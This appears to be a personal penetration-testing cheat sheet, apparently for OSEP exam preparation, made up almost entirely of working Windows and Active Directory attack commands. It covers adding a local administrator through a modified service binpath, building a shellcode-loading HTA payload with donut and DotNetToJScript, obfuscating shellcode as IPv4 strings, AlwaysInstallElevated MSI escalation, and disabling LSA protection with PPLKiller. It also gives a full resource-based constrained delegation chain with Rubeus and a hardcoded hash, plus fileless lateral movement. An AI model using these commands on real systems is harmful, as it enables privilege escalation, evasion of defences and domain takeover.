Service Modify
---------------------
```powershell
sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
```
```bash
for i in {1..255} ;do (ping -c 1 192.168.110.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

HTA JS PAYLOAD
---------------------
DotNetToJScript
```powershell
C:\Users\ctf\Downloads\donut_v1.1\donut.exe -a 2 -f 1 -o ipv4.bin -i ipv4shell.exe
```
Change in TestClass.cs file url

Build ExampleAssemly.dll


Generate the js file
```
C:\Users\ctf\Downloads\release_v1.0.4\DotNetToJscript.exe ExampleAssembly.dll --lang=JScript --ver=4 -o payload.js
```

```hta
<html>
<head>
<script language="JScript">
// ADD JS HERE
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

IPV4Shell - HellShell
---------------------
URL -> https://github.com/NUL0x4C/HellShell

```powershell
C:\Users\ctf\Downloads\HellShell-main\HellShell-main\x64\Release\HellShell.exe payload.bin ipv4
# Generates Ipv4Fuscation.cpp -> Modify 
Z:\Offsec\OSEP\ipv4shell\src\ipv4shell.c
```
Modify the IP values
and compile to exe

Install AlwaysElevated
-----------------------
```powershell
Create MSI Package to run
dotnet build -p:Platform=x64 -c Release
cmd.exe /c "msiexec /quiet /qn /i InstallMe.msi"
```

Run the combined ligolo agent with ApplockerBypass
-----------------------

If LSA Protection 
--------------------
```powershell
PPLKiller.exe /installDriver
```
RBCD
--------------------
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer file05 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/file05 /ptt
```

Lateral Movement
---------------------
 -> https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement

```powershell
lat.exe <server> <service name> <payload.exe>
Lat.exe file05 SensorService “C:\windows\tasks\inj.exe”
```

uacbypass.ps1
SigmaPotato.exe
